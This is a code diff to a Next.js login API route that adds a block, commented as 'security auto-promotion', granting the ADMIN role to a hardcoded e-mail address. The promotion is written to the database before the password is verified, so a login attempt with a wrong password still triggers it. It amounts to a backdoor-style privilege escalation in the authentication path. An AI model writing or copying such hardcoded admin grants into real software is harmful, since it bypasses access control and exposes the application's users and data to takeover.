@@ -23,6 +23,15 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ error: 'E-mail ou senha incorretos' }, { status: 400 });
     }
 
+    // Auto-promoção de segurança para o administrador
+    if (['cevsouza@hotmail.com', 'cevsouza@hotmail'].includes(emailLower) && user.role !== 'ADMIN') {
+      await db.user.update({
+        where: { id: user.id },
+        data: { role: 'ADMIN' }
+      });
+      user.role = 'ADMIN';
+    }
+
     // Verify password
     const hashedInputPassword = await hashPassword(password);
     if (user.password !== hashedInputPassword) {
